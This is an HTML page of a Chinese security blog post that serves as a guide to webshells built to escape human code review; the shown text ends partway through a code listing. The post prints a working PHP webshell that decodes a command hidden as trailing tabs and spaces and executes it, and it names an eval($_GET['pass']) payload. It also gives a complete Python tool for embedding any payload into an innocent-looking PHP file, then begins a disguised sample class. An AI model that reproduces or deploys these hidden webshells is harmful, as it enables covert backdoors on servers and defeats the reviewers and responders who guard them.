@@ -1,0 +1,1033 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="一份带 Webshell 过人指南">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Webshell 过狗没意思，我们要过人！">
+<meta property="og:url" content="https://www.tr0y.wang/2020/07/14/webshell-bypass-human/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="一份带 Webshell 过人指南">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/webshell.png/cover">
+<meta property="article:published_time" content="2020-07-14T17:36:01.000Z">
+<meta property="article:modified_time" content="2025-02-21T02:54:01.962Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogcovers-1252075454.cos.ap-shanghai.myqcloud.com/webshell.png/cover">
+  
+  
+  
+  <title>Webshell 过狗没意思，我们要过人！ - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Webshell 过狗没意思，我们要过人！"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2020-07-14 17:36" pubdate>
+          2020年7月14日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          82 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(79)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/11/02/DNS-3-attack-by-dns/" title="DNS 安全（三）：利用 DNS 协议发起的攻与防"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（三）：利用 DNS 协议发起的攻与防</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Webshell 过狗没意思，我们要过人！</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>一份带 Webshell 过人指南</p>
+<span id="more"></span>
+<h2 id="一个经典的过人-webshell">一个经典的过人 WebShell</h2>
+<p>大概是在前年，闲着无聊的时候翻阅知乎，看到了这么一个回答：</p>
+<p>https://www.zhihu.com/question/68591788/answer/269545371</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/webshell-bypass-human/20200714053929363.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>其中最后那个过人的 webshell 引起了我的注意：<br />
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">newDataProvider</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-variable">$r</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$f</span>); <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">15</span>)&#123;<br>                <span class="hljs-variable">$r</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dataProcessor</span>(<span class="hljs-variable">$f</span>[<span class="hljs-variable">$i</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$c</span> .= <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">dataProcessor</span>(<span class="hljs-variable">$f</span>[<span class="hljs-variable">$i</span>]);<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$t</span> = <span class="hljs-variable">$r</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&quot;<span class="hljs-subst">$c</span>&quot;</span>);<br>        <span class="hljs-variable">$t</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dataProcessor</span>(<span class="hljs-params"><span class="hljs-variable">$li</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/([\t ]+)\r?\n?$/&#x27;</span>, <span class="hljs-variable">$li</span>, <span class="hljs-variable">$m</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>            <span class="hljs-variable">$l</span> = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;\t&quot;</span>));<br>            <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&quot; &quot;</span>));<br>            <span class="hljs-variable">$n</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$l</span>.<span class="hljs-variable">$r</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$n</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">newDataProvider</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p>就像这位答主说的那样，大家能不能看出这个是 webshell 呢？以及评估一下自己在真实的系统中，很多 php 文件存在的情况下，能不能发觉这个 php 文件有点问题呢？我个人感觉自己在应急响应时，只有仔细看的时候才能发觉这是个 webshell，要不然我肯定粗略扫一眼以为是正常的 php 业务代码，直接放过。还有些人喜欢通过检索 webshell 关键字这样批量去找，这就更不可能找到了。</p>
+<p>那么这个 webshell 的原理是什么呢？每一行最后都有空格与制表符。<code>\t</code>的数量代表着 ascii 码 16 进制的第一位，空格的数量代表着 ascii 码 16 进制的第二位。然后有个关键的 <code>15</code>，其实代表了前 15 行的空白字符组成的是 <code>create_function</code>，后面就可以写一句话咯，例如 <code>eval($_GET["pass"]);</code>，每一行写入一个字符即可。执行的时候先读取自身代码之后，按行提取出里面的空格和制表符，提取出隐藏的代码之后执行就完事了。</p>
+<p>当然，要自己去加空格和制表符简直是反人类，所以我写了个隐藏 webshell 的代码如下：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">put_color</span>(<span class="hljs-params">string, color</span>):<br>    colors = &#123;<br>        <span class="hljs-string">&#x27;red&#x27;</span>: <span class="hljs-string">&#x27;31&#x27;</span>,<br>        <span class="hljs-string">&#x27;green&#x27;</span>: <span class="hljs-string">&#x27;32&#x27;</span>,<br>        <span class="hljs-string">&#x27;yellow&#x27;</span>: <span class="hljs-string">&#x27;33&#x27;</span>,<br><br>        <span class="hljs-string">&#x27;blue&#x27;</span>: <span class="hljs-string">&#x27;34&#x27;</span>,<br>        <span class="hljs-string">&#x27;pink&#x27;</span>: <span class="hljs-string">&#x27;35&#x27;</span>,<br>        <span class="hljs-string">&#x27;cyan&#x27;</span>: <span class="hljs-string">&#x27;36&#x27;</span>,<br>        <span class="hljs-string">&#x27;gray&#x27;</span>: <span class="hljs-string">&#x27;2&#x27;</span>,<br>        <span class="hljs-string">&#x27;white&#x27;</span>: <span class="hljs-string">&#x27;37&#x27;</span>,<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\033[40;1;%s;40m%s\033[0m&#x27;</span> % (colors[color], <span class="hljs-built_in">str</span>(string))<br><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]:<br>    sys.exit(<br>        <span class="hljs-string">&#x27;&#x27;&#x27;[!] usage: python hidden_webshell.py payload filename [output_filename]\n&#x27;&#x27;&#x27;</span><br>        <span class="hljs-string">&#x27;&#x27;&#x27;  [-] example: python &#123;&#125;&#123;&#125;&#123;&#125;&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(<br>            put_color(<span class="hljs-string">&#x27;hidden_webshell.py&#x27;</span>, <span class="hljs-string">&#x27;white&#x27;</span>),<br>            put_color(<span class="hljs-string">&#x27;&#x27;&#x27; &#x27;system(&quot;echo \\&quot;hacked by Tr0y :)\\&quot;&quot;);&#x27; &#x27;&#x27;&#x27;</span>, <span class="hljs-string">&#x27;green&#x27;</span>),<br>            put_color(<span class="hljs-string">&#x27;webshell.php&#x27;</span>, <span class="hljs-string">&#x27;blue&#x27;</span>)<br>        )<br>    )<br><br>webshell_name = sys.argv[<span class="hljs-number">2</span>]<br>hidden_name = sys.argv[<span class="hljs-number">3</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">4</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;webshell_hidden.php&#x27;</span><br>exp = sys.argv[<span class="hljs-number">1</span>]  <span class="hljs-comment"># &#x27;&#x27;&#x27;system(&quot;echo &#x27;hacked by Tr0y :)&#x27;&quot;);&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> exp.endswith(<span class="hljs-string">&#x27;;&#x27;</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] WARN: &#123;&#125; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<br>        put_color(<span class="hljs-string">&#x27;The payload should end in&#x27;</span>, <span class="hljs-string">&#x27;yellow&#x27;</span>),<br>        put_color(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-string">&#x27;cyan&#x27;</span>)<br>    ))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Hide webshell&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;  [-] Read from &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(put_color(webshell_name, <span class="hljs-string">&#x27;blue&#x27;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;  [-] Payload is &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(put_color(exp, <span class="hljs-string">&#x27;green&#x27;</span>)))<br><br>payload = <span class="hljs-string">&#x27;create_function&#x27;</span> + exp<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(webshell_name, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    raw_php = fp.readlines()<br><br><span class="hljs-keyword">for</span> line, content <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(payload):<br>    hex_num = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(content))<br>    tab_num = <span class="hljs-built_in">int</span>(hex_num[<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>    space_num = <span class="hljs-built_in">int</span>(hex_num[<span class="hljs-number">3</span>], <span class="hljs-number">16</span>)  <span class="hljs-comment"># 最好用空格的个数代表个位数</span><br><br>    hidden = <span class="hljs-string">&#x27;\t&#x27;</span> * tab_num + <span class="hljs-string">&#x27; &#x27;</span> * space_num<br>    <span class="hljs-keyword">if</span> line &lt; <span class="hljs-built_in">len</span>(raw_php):<br>        <span class="hljs-keyword">if</span> raw_php[line].endswith(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>            raw_php[line] = raw_php[line][:-<span class="hljs-number">1</span>] + hidden + <span class="hljs-string">&#x27;\n&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            raw_php[line] = raw_php[line] + hidden<br>    <span class="hljs-keyword">else</span>:<br>        raw_php.append(hidden + <span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(hidden_name, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>    fp.writelines(raw_php)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Saved as &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(put_color(hidden_name, <span class="hljs-string">&#x27;blue&#x27;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] All done\n\nBye :)&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>然后需要准备一个看似正常的 php 代码。其实这个很重要，如果你的 php 代码看起来越无害，隐蔽效果就越好：<br />
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">getHigherScore</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$lines</span> = <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-keyword">__FILE__</span>)<br>        <span class="hljs-variable">$lower</span> = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-variable">$higher</span> = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$lines</span>); <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getArrayValue</span>(<span class="hljs-variable">$lines</span>[<span class="hljs-variable">$i</span>])<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">15</span>) &#123;<br>                <span class="hljs-variable">$lower</span> .= <span class="hljs-variable">$value</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$higher</span> .= <span class="hljs-variable">$value</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$verifyScore</span> = <span class="hljs-variable">$lower</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$higher</span>&quot;</span>)<br>        <span class="hljs-variable">$result</span> = <span 